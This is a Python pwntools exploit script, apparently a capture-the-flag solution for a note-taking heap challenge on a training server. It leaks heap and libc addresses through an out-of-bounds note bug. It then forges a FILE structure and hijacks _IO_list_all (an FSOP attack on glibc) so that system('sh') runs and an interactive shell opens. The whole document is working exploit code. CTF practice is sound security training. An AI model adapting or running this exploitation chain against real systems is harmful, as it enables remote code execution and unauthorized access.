#!/usr/bin/env python3
from pwn import *

PORT = 1337
HOST = "pwn-my-note-da2e57222095.training.bksec.vn"
elf = context.binary = ELF('./chall_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            brva 0x0000000000001DFA
            brva 0x000000000000210B
            brva 0x0000000000001E9B
            brva 0x00000000000019AA
            brva 0x0000000000001F84
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT, ssl=True, sni=HOST)
    else:
        return elf.process()

p = conn()

def sla(pr, dt): p.sendlineafter(pr, dt)
def sa(pr, dt): p.sendafter(pr, dt)
def sl(pr, dt): p.sendline(pr, dt)
def s(pr, dt): p.send(pr, dt)

def menu(opt): sla(b'Your choice: ', str(opt).encode())

def create(tt, ct):
    menu(1)
    sla(b'title: ', tt)
    sla(b'content: ', ct)

def view():
    menu(2)

def edit(tt, ct):
    menu(3)
    sla(b'to edit: ', tt)
    sla(b'content: ', ct)

def delete(tt):
    menu(4)
    sla(b'to delete: ', tt)

def reg(fn, us, pw):
    menu(1)    
    sla(b'full name: ', fn)
    sla(b'username: ', us)
    sla(b'password: ', pw)

def login(us, pw):
    menu(2)
    sla(b'username: ', us)
    sla(b'password: ', pw)

# Stage 1: Leak heap + libc

reg(b'DinhDuc1', b'd1nhdwc', b'1'*8)
login(b'd1nhdwc', b'1'*8)

menu(4)
for i in range(10):
    pl = f'{i}'*7
    create(b'A' + pl.encode(), f'{chr(ord(b'A')+i)}'*8)

menu(5)
menu(3)

reg(b'DinhDuc2', b'd1nhdwc', b'2'*8)
login(b'd1nhdwc', b'2'*8)

menu(4)
for i in range(11):
    pl = f'{i}'*7
    create(b'B' + pl.encode(), f'{chr(ord(b'A')+i)}'*8)

create(b'oob_content', b'A'*8)
menu(5)
menu(3)
login(b'd1nhdwc', b'1'*8)
# GDB()
menu(4)
menu(2)
p.recvuntil(b'Title: ')
heap = u64(p.recvuntil(b'Content:', drop=True).ljust(8, b'\x00')) - 0x2ae0
log.success(f'heap :{hex(heap)}')

note0 = heap + 0x2ae0
libc_slot = heap + 0x1e20  + 0x40
# GDB()
pl = flat(
    b'X'*0x20,
    libc_slot
    )

edit(p64(note0), pl)

for i in range(1, 9):
    pl = f'{i}'*7
    delete(b'A' + pl.encode())

# GDB()
view()
p.recvuntil(b'X'*0x20)
p.recvuntil(b'Content: ')
libc.address = u64(p.recv(6).ljust(8, b'\x00')) - 0x204b20
log.success(f'libc :{hex(libc.address)}')

# Stage 2: FSOP
menu(5)
menu(3)
login(b'd1nhdwc', b'2'*8)
menu(4)

  
for i in range(8):
    pl = f'{i}'*7

    create(b'C' + pl.encode(), f'{chr(ord(b'A')+i)}'*8)

menu(5)
menu(3)
login(b'd1nhdwc', b'1'*8)
notec0 = heap + 0x1d10
menu(4)
fsop = flat({
    0x0: b'  sh\x00\x00\x00\x00',
    0x20: 0,  # write_base
    0x28: 1,  # write_ptr
    0x68: libc.sym.system,  # wide_vtable[0x68]
    0x88: notec0 + 0x200,  #_lock
    0xa0: notec0,          # _wide_data
    0xd8: libc.sym._IO_wfile_jumps,  # vtable
    0xe0: notec0           # wide_vtable
    }, filler = b'\x00')


edit(b'C0000000', fsop)

pl = b'Y'*8 + b'\x00'*0x18 + p64(libc.sym._IO_list_all)
# GDB() 
edit(p64(heap + 0x18e0), pl)
edit(b'Y'*8 + b'\x00', p64(notec0))

menu(5)
menu(6)

p.interactive()